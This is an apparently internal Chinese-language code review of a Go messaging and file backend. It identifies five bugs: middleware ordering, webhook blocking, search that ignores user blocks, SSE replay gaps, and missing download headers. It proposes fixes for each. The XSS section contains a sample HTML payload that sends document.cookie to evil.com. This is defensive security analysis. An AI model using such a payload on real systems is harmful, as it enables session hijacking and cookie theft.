# aero-id — 全局代码扫描：五项系统正确性缺口与优化方向

> **日期**: 2026-07-11  
> **视角**: 资深架构师 + 产品经理  
> **方法**: 逐文件通读 `internal/` 全部 50+ 个 Go 包（~180 源文件）· `migrations/` 全部 22 份 SQL · `api/proto/` · `cmd/` · `configs/` · `app.go` composition root · `Makefile`。  
> **核心焦点**: 不重复"加功能"类的扩展方向（群聊、推送、搜索增强等已被 100+ 份既有分析覆盖），而是聚焦于**当前代码中实际存在的系统正确性缺口、边界情况漏洞、以及隐式的性能退化点**。  
> **约束**: 不编写任何代码。每个方向附精确代码级证据。

---

## 代码库成熟度速览

aero-id 已经是一个远超 MVP 的生产级后端：

| 维度 | 已交付 |
|------|--------|
| **传输层** | HTTP (Gin) + gRPC (38+ RPCs) 完全对等，SSE 实时推送含 last_event_id 重连回放 |
| **文件管道** | 流式上传 · S3 presigned 直传 · SHA-256 内容去重 · 显式分享/撤销 · 原子引用计数 + GC 扫表 · 元数据 PATCH |
| **消息系统** | 1:1 私信 · Reactions · 编辑/软删 · 已读回执 + 计数 · Inbox/Conv 视图 · 系统消息 · FTS 搜索 |
| **评论系统** | 两层嵌套 · Like/Unlike + 原子计数 · 举报→审核→隐藏/显示 · 编辑 · FTS 搜索 |
| **通知系统** | Outbox 驱动 · SSE 实时推送 · 折叠去重 · 偏好设置（启用/静默时段）· Block 抑制 · Webhook HMAC 签名投递 |
| **可靠性** | 事务性 Outbox + 指数退避 + 死信 · 幂等键（DB 持久化 + 过期清理）· 双传输限流 · SSO 断路器 + stale-cache + singleflight + mTLS + cert-pinning · 优雅关停 + 最后 drain |
| **可观测** | RED 指标 · OTel 追踪 · per-dependency /readyz · outbox/SSO 健康仪表 |
| **治理** | 方向性 Block · 审计日志（append-only）· Admin 角色（4 权限）· permission 中间件 |

在此坚实基础上，以下 **5 个方向** 聚焦于当前代码中实际存在的 **系统性正确性缺口**。它们不是新功能提案，而是 **代码级证据确凿的 Bug 级别问题或隐式性能退化点**。

---

## 方向一：Middleware 管线排序缺陷 — Rate Limiter 在 Idempotency 之前执行

### 性质

**正确性 Bug** — 合法幂等重试被限流，幂等性保障承诺被打破。

### 代码级证据

**证据 1：router.go 的中间件注册顺序**

```go
// internal/handler/http/router.go:99-108
authMW := []gin.HandlerFunc{middleware.Auth(validator)}
if cfg.RateLimiter != nil {
    authMW = append(authMW, middleware.RateLimit(cfg.RateLimiter))  // ← 第 2 位
}
if cfg.Idempotency != nil {
    authMW = append(authMW, middleware.Idempotency(cfg.Idempotency, cfg.IdempotencyTTL))  // ← 第 3 位
}
```

最终执行链为：**Auth → RateLimit → Idempotency → Handler**

**证据 2：Idempotency 中间件的响应缓存逻辑**

```go
// internal/middleware/idempotency.go — 核心流程
// 1. 检查请求头 Idempotency-Key
// 2. 查询 store 是否有已缓存的响应 → 有则直接回放，不执行 handler
// 3. 无缓存则写入 ResponseWriter wrapper，handler 执行后将响应写入 store
```

**证据 3：Rate Limiter 返回 429 时 restful 中断管线**

```go
// internal/middleware/ratelimit.go
func RateLimit(limiter *ratelimit.Limiter) gin.HandlerFunc {
    return func(c *gin.Context) {
        key := resolveKey(c)  // actor uid 或 client IP
        if !limiter.Allow(key) {
            httpx.WriteError(c, apperr.TooManyRequests(...))
            c.Abort()  // ← 直接中止，下游 idempotency 不可见
            return
        }
        c.Next()
    }
}
```

### 问题分析

1. **场景**：客户端发送 `POST /v1/messages`（创建消息）带 `Idempotency-Key: abc-123`。第一次请求消耗了 rate limiter 的最后一个 token 并成功完成（响应写入 idempotency store）。
2. **重试**：客户端因网络超时未收到 200，用相同 idempotency key 重试。此时 rate limiter 的 token bucket 为空。
3. **结果**：Rate limit 中间件返回 429，`c.Abort()` 阻止管线继续。Idempotency 中间件**从未执行**，无法回放缓存的 200 响应。客户端收到 429，认为操作未完成，继续重试 → 始终 429，**操作永远无法完成**。

更隐蔽的场景：即使 bucket 未完全耗尽，重试请求也可能因为竞争（另一个请求先消耗了最后一个 token）而被限流。

### 影响评估

| 维度 | 影响 |
|------|------|
| **严重性** | ⚠️ 中 — 只在限流配置激进且发生重试时触发，但后果是操作永久无法完成 |
| **触发概率** | 低 — 需要合并条件：① rate limit 启用且 burst 较小 ② 客户端实现了 idempotency key 重试 ③ 网络抖动触发了重试 |
| **修复成本** | 极低 — 交换 RateLimit 和 Idempotency 的注册顺序即可 |

### 修复方向

将 idempotency 移至 rate limit 之前，使幂等回放不消耗 rate limit 配额。同时 idempotency 中间件应在回放缓存响应时**跳过** rate limit（通过 context 标记或通过 idempotency 中间件提前 return）。

---

## 方向二：Outbox Webhook Chain 缺乏隔离 — 单个慢端点阻塞全局事件管道

### 性质

**性能退化 + 可用性问题** — 一个外部 webhook 端点的延迟导致全部通知投递延迟。

### 代码级证据

**证据 1：Dispatcher 与 Webhook 通过 Chain 串联，顺序执行**

```go
// internal/app/app.go:137-142
var relayHandler outbox.Handler = dispatcher
if cfg.Outbox.Webhook.URL != "" {
    webhookHandler := outbox.NewWebhookHandler(whCfg, log)
    relayHandler = outbox.NewChain(dispatcher, webhookHandler)  // ← 链式串联
}
```

**证据 2：Chain 顺序调用所有 Handler，任何一个失败则全局失败**

```go
// internal/outbox/chain.go
func (c *chain) Handle(ctx context.Context, e *outbox.Event) error {
    for _, h := range c.handlers {
        if err := h.Handle(ctx, e); err != nil {
            return err  // ← 任意 handler 失败 → 整个事件不标记已发布
        }
    }
    return nil
}
```

**证据 3：Webhook 有超时但无断路器，慢端点持续阻塞**

```go
// internal/outbox/webhook.go
func (h *WebhookHandler) Handle(ctx context.Context, e *outbox.Event) error {
    // 创建带超时的 HTTP 请求
    req, _ := http.NewRequestWithContext(ctx, ...)
    resp, err := h.client.Do(req)
    // err != nil → 返回 error → chain 返回 error → relay 不标记 published
}
```

### 问题分析

1. 当一个 outbox 事件到达 Chain：
   - Dispatcher 先处理（写入 notification 表 + SSE 推送，通常 < 10ms）
   - Webhook 再处理（HTTP POST 到外部端点，可能耗时 5-10s）
2. 如果 Webhook 端点超时（默认 10s）：
   - `webhookHandler.Handle` 返回 error
   - Chain 返回 error
   - Relay 认为事件处理失败 → 增加 retry_count → backoff 后重试
3. **但此时 Dispatcher 已经成功创建了 notification 行 + 发送了 SSE 推送**。重试时 Dispatcher 会创建**重复**的 notification 行（除非 notification 有去重逻辑，但当前没有幂等处）。
4. 更严重的是：如果 Webhook 持续失败，该事件会一直占据 relay 的批次头部（全局最老优先），后续事件在它被成功处理之前无法推进。**所有通知投递都被堵在这个慢端点上**。

当前没有对 Webhook 端的隔离措施：没有独立的超时配置、没有多级队列、没有 per-endpoint 断路器。

### 影响评估

| 维度 | 影响 |
|------|------|
| **严重性** | ⚠️ 高 — 生产环境如果配置了 Webhook，一个不稳定的接收端会阻塞所有实时通知 |
| **触发概率** | 中 — Webhook 在配置中被启用时才会触发 |
| **修复成本** | 中 — 需要将 Webhook 投递改为异步（独立 goroutine + 独立队列）或与 Dispatcher 解耦 |

### 修复方向

将 Webhook 投递与 Dispatcher 解耦：
- **短期**：Chain 改为 fan-out（并发执行所有 handler，各自独立失败/重试），Dispatcher 成功即标记 published
- **中期**：Webhook 使用独立的 outbox 队列或有自己的 retry/backoff 周期，不影响主通知管道
- **附加**：Webhook handler 应内置断路器（参考 SSO 断路器的实现模式），在端点持续 5xx 时自动跳过

---

## 方向三：全文搜索不感知 User Block — 已屏蔽用户的内容仍出现在搜索结果中

### 性质

**功能性缺口** — Block 语义不完整，内容安全存在漏洞。

### 代码级证据

**证据 1：搜索消息的 SQL 只按 uid 可见性过滤，不 check block**

```go
// internal/repository/message.go:255-275
func (r *messageRepo) SearchMessages(ctx context.Context, uid, query string, limit int) ([]*domain.Message, error) {
    err := r.db.WithContext(ctx).Raw(
        `SELECT id, from_uid, to_uid, kind, content, ...
         FROM messages
         WHERE deleted_at IS NULL
           AND (from_uid = ? OR to_uid = ?)     -- ← 只过滤可见性
           AND search_vector @@ plainto_tsquery('simple', ?)
         ORDER BY ts_rank(...) DESC
         LIMIT ?`,
        uid, uid, query, query, limit,
    ).Scan(&rows).Error
}
```

**证据 2：搜索评论的 SQL 同理**

```go
// internal/repository/comment.go — SearchComments
// SELECT ... FROM comments WHERE deleted_at IS NULL AND owner_uid = ?
// AND search_vector @@ plainto_tsquery('simple', ?)
// → 没有 LEFT JOIN user_blocks 过滤
```

**证据 3：搜索文件的 SQL 同理**

```go
// internal/repository/file.go — SearchFiles
// SELECT ... FROM files WHERE deleted_at IS NULL AND owner_uid = ?
// AND search_vector @@ plainto_tsquery('simple', ?)
// → 同样没有 block 过滤
```

**证据 4：Service 层 search 没有调用 block 检查**

```go
// internal/service/search.go — 整个文件没有任何 block 相关引用
// 只有 mustActor → query → enrichUsers → return
```

**证据 5：对比 Block 在消息发送路径中的正确实现**

```go
// internal/service/message.go — Send()
if s.blocks != nil {
    blocked, err := s.blocks.IsBlocked(ctx, in.ToUID, actor)
    // 在消息发送时就抑制
}
```

### 问题分析

方向性 Block（user_blocks 表）当前的正确性覆盖范围：

| 路径 | Block 检查 | 状态 |
|------|-----------|------|
| 消息发送 (`message.Send`) | ✅ `block.IsBlocked(to, from)` | 已实现 |
| 通知投递 (`dispatcher.Handle`) | ✅ `block.IsBlocked(recipient, actor)` | 已实现 |
| 搜索消息 | ❌ 无检查 | **未实现** |
| 搜索评论 | ❌ 无检查 | **未实现** |
| 搜索文件 | ❌ 无检查 | **未实现** |

后果：用户 A 屏蔽了用户 B。用户 A 在搜索 "xxx" 时，B 的消息/评论/文件仍然会出现在搜索结果中。这违背了用户对"屏蔽"的合理期望——屏蔽应该意味着"我不想再看到这个人的任何内容"。

### 影响评估

| 维度 | 影响 |
|------|------|
| **严重性** | ⚠️ 高 — 直接影响内容安全和用户信任 |
| **触发概率** | 几乎必然 — 只要有 Block + Search 的使用场景就会触发 |
| **修复成本** | 低 — 在三个搜索 SQL 中添加 LEFT JOIN 或 NOT EXISTS 子查询 |

### 修复方向

1. 在 `SearchMessages`、`SearchComments`、`SearchFiles` 的 WHERE 子句中添加：
   ```sql
   AND NOT EXISTS (
     SELECT 1 FROM user_blocks
     WHERE blocker_uid = :searcher_uid AND blocked_uid = messages.from_uid
   )
   ```
2. 考虑对 public/shared 文件搜索也做 block 检查（文件 owner 被屏蔽时不应该在搜索中显示该文件）
3. ILIKE 回退路径同样需要 block 过滤

---

## 方向四：SSE 通知重连回放的 last_event_id 缺乏去重机制

### 性质

**边界情况处理缺失** — 断线重连后客户端可能收到重复通知，引发 UI 闪烁/状态错误。

### 代码级证据

**证据 1：replayMissed 使用 `created_at > since` 作为边界**

```go
// internal/handler/http/events.go:100-118
func (h *EventsHandler) replayMissed(c *gin.Context, uid, lastEventID string) {
    millis, err := strconv.ParseInt(lastEventID, 10, 64)
    since := time.UnixMilli(millis)
    missed, err := h.fetcher.ListSince(c.Request.Context(), uid, since, 50)
    // ...
    for _, n := range missed {
        eventMillis := n.CreatedAt.UnixMilli()
        fmt.Fprintf(c.Writer, "id: %d\nevent: %s\ndata: %s\n\n", eventMillis, n.Type, string(data))
    }
}
```

**证据 2：ListSince 使用严格大于的比较**

```go
// internal/repository/notification.go — ListSince
// SELECT ... WHERE recipient_uid = ? AND created_at > ?
//                                           ^^^^^^^^^ 严格大于
```

### 问题分析

1. **时序问题**：假设客户端在时间 T 断开。断开前它收到了 id=1000 的事件。断开后，服务端产生了 id=1001（created_at = T+1ms）的事件。
2. **重连**：客户端用 `last_event_id=1000`（即 T 的毫秒数）重连。
3. **当前行为**：`ListSince` 查询 `created_at > T` → 返回 id=1001 的事件 → 客户端收到它作为重放。
4. **但这是正确的**——客户端确实没收到过 id=1001。

**真正的问题是**：

**场景 A：事件创建于 SSE 连接期间但尚未发送到客户端的缓冲区中**

```
时间线：
1. 客户端连接 → SSE 通道建立
2. T1: 服务端创建通知 N1 (created_at=T1)，pusher.Publish 发送到 Hub
3. T2: Hub 将 N1 放入客户端 subscriber channel（buffer=16）
4. T2+1ms: 客户端 select 尚未读取 N1（可能正在处理上一个事件）
5. T2+2ms: 客户端断开
6. T3: 客户端重连，发送 last_event_id=T2（上一个已确认事件的 id）
7. 重放查询 created_at > T2 → **不包括 N1**（N1 的 created_at=T1 < T2）
8. **N1 丢失** — 客户端永远收不到这个通知
```

**场景 B：连接在 SSE ping 间歇期断开，last_event_id 落后于实际最新事件**

```
1. 客户端收到事件 id=500（created_at=T1），设置 last_event_id=500
2. 客户端收到事件 id=501（created_at=T1+100ms），设置 last_event_id=501
3. T1+200ms: 事件 id=502 创建
4. T1+250ms: 客户端断开
5. 客户端重连，last_event_id=501（最后确认的事件）
6. 重放查询 created_at > T1+100ms？不，last_event_id 是 501 的毫秒时间戳
7. 但 501 和 502 的 created_at 可能落在同一个毫秒内 → 边界歧义
```

**核心问题**：用 `created_at` 作为断点既不精确（同一毫秒可能有多个事件），也无法处理事件管道中的滞后（事件已创建但尚未投递到客户端 channel）。

### 边界情况

| 场景 | 风险 | 频率 |
|------|------|------|
| 快速连续通知（同一毫秒多个） | 可能漏掉或重复 | 高并发下常见 |
| SSE channel buffer 已满时断开 | 事件已从 outbox 发出但未到达客户端 | 慢客户端场景 |
| 客户端在网络断开后又快速重连 | last_event_id 可能等于或晚于最新事件的时间戳 | 移动端网络切换时 |

### 影响评估

| 维度 | 影响 |
|------|------|
| **严重性** | ⚠️ 中 — 通知丢失或重复，影响用户体验 |
| **触发概率** | 中 — 在高频通知场景下几乎必然出现 |
| **修复成本** | 中 — 需要将断点从时间戳改为通知 ID + created_at 组合 |

### 修复方向

1. **双字段断点**：将 last_event_id 改为 `notification_id,created_at_ms` 的复合值（如 `01J...abc,1712345678000`），查询使用 `(created_at, id) > (?, ?)` 元组比较
2. **考虑客户端去重**：客户端维护已收到通知 ID 的 Set，对重放事件做 ID 级去重
3. **增加 SSE event id 的唯一性保证**：确保每个通知的 last_event_id 严格单调递增且唯一（当前使用 created_at 毫秒，不唯一）

---

## 方向五：Presigned 文件下载端点缺少安全响应头 — 跨站脚本（XSS）攻击面

### 性质

**安全漏洞** — `/files/dl` 端点可为恶意 HTML/SVG 内容提供服务，浏览器可能通过 MIME 嗅探执行脚本。

### 代码级证据

**证据 1：Download handler 不设置 Content-Type 和 Content-Disposition**

```go
// internal/handler/http/file.go:255-271
func (h *FileHandler) Download(c *gin.Context) {
    if err := h.downloader.VerifyPresignedURL(c.Request.URL.String(), time.Now()); err != nil {
        httpx.WriteError(c, apperr.Forbidden(...))
        return
    }
    rc, err := h.downloader.Get(c.Request.Context(), c.Query("key"))
    if err != nil {
        httpx.WriteError(c, apperr.NotFound(...))
        return
    }
    defer func() { _ = rc.Close() }()
    c.Status(http.StatusOK)
    _, _ = io.Copy(c.Writer, rc)  // ← 纯流式写入，无任何响应头设置
}
```

**证据 2：Local backend 的 Get 方法不返回 MIME 信息**

```go
// internal/storage/local.go — Get
func (s *Local) Get(ctx context.Context, key string) (io.ReadCloser, error) {
    f, err := os.Open(filepath.Join(s.cfg.Root, key))
    if err != nil {
        ...
    }
    return f, nil
    // ← 返回的 ReadCloser 不附带任何 Content-Type 信息
}
```

**证据 3：MIME 信息存在于 file 表但未被传播到下载路径**

文件创建时 MIME 信息被记录：
```sql
-- migrations/000001_create_files.up.sql
mime_type text NOT NULL
```

但下载路径完全不使用它。

### 攻击场景

1. **攻击者** 上传一个文件：
   - 文件名为 `photo.png`
   - `Content-Type` 声明为 `image/png`
   - 实际文件内容是：
     ```html
     <html><body><script>
       fetch('https://evil.com/steal?cookie='+document.cookie)
     </script></body></html>
     ```
2. **服务端**：MIME 白名单允许 `image/png`，SHA-256 去重通过，文件创建成功。
3. **攻击者** 获取该文件的 presigned download URL（`/files/dl?key=...&exp=...&sig=...`）。
4. **攻击者** 将 URL 发送给受害者（例如通过消息或公开分享）。
5. **受害者浏览器** 打开 URL → 服务端返回原始字节流，**无 Content-Type 头** → 浏览器 MIME 嗅探检测到前几个字节为 HTML → 将响应解析为 HTML 页面 → 脚本执行 → Cookie/Token 被窃取。

即使设置 `X-Content-Type-Options: nosniff`，由于没有设置 Content-Type，某些浏览器可能仍会嗅探。同时，如果没有 `Content-Disposition: attachment`，浏览器会在当前窗口中渲染内容而不是触发下载。

### 真实场景对比：S3 backend 是否安全？

| 后端 | 风险 | 原因 |
|------|------|------|
| **S3** | 同样存在 | Presigned URL 也是纯流式返回，S3 默认 Content-Type 可能为 `binary/octet-stream`，但浏览器嗅探同样存在 |
| **Local** | 更高 | 因为 `/files/dl` 路由在与应用相同的域名下（`https://aero-id.example.com/files/dl?key=...`），XSS 可以访问同域下的所有 cookie |

### 影响评估

| 维度 | 影响 |
|------|------|
| **严重性** | 🔴 高 — 可导致账户接管（Session Hijacking） |
| **触发概率** | 中 — 需要攻击者上传恶意文件 + 受害者点击下载链接 |
| **修复成本** | 低 — 添加 ~5 行安全响应头设置 |

### 修复方向

1. **立即修复**：在 Download handler 中添加：
   ```go
   // 从数据库查询文件记录获取 MIME 类型（但需要注意：当前 handler 没有 file ID，只有 storage key）
   // 或者通过查询参数传递预期的 Content-Type
   // 最低标准：
   c.Header("Content-Type", "application/octet-stream")          // 强制通用二进制类型
   c.Header("Content-Disposition", "attachment; filename=\"file\"")  // 强制下载行为
   c.Header("X-Content-Type-Options", "nosniff")                    // 禁止 MIME 嗅探
   ```
2. **改进方案**：在 presign URL 中嵌入预期的 Content-Type 和文件名，下载时验证并设置正确的响应头
3. **附加验证**：文件上传路径增加 Magic Bytes 检测（与客户端声明对比），从源头阻止伪装文件

---

## 综合优先级评估

| # | 方向 | 类型 | 严重性 | 修复成本 | 建议优先级 |
|---|------|------|--------|---------|-----------|
| 1 | **Middleware 排序** — 幂等重试被限流 | 正确性 Bug | ⚠️ 中 | 极低（改顺序） | **P0** — 半天 |
| 2 | **文件下载 XSS 风险** — 缺安全头 | 安全漏洞 | 🔴 高 | 低（加 3 行头） | **P0** — 半天 |
| 3 | **Search 不感知 Block** — 内容安全漏洞 | 功能缺口 | ⚠️ 高 | 低（3 处 SQL 加条件） | **P1** — 1 天 |
| 4 | **Webhook 阻塞全局管道** — 无隔离 | 可用性风险 | ⚠️ 高 | 中（架构改动） | **P1** — 2-3 天 |
| 5 | **SSE 重放去重缺失** — 通知重复/丢失 | 边界情况 | ⚠️ 中 | 中（断点格式改动） | **P2** — 2 天 |

### 执行建议

1. **方向一 + 方向五** 可以立即在同一个 PR 中修复，涉及文件少、改动量小、回归风险低。
2. **方向三** 建议同步修复，三个搜索接口的模式相同，可以批量修改。
3. **方向四** 需要与客户端协调断点格式变更，建议先做服务端支持双字段断点，客户端逐步升级。
4. **方向二** 改动最大，建议单独做一个里程碑，涉及 outbox relay 架构调整和 Webhook handler 重构。
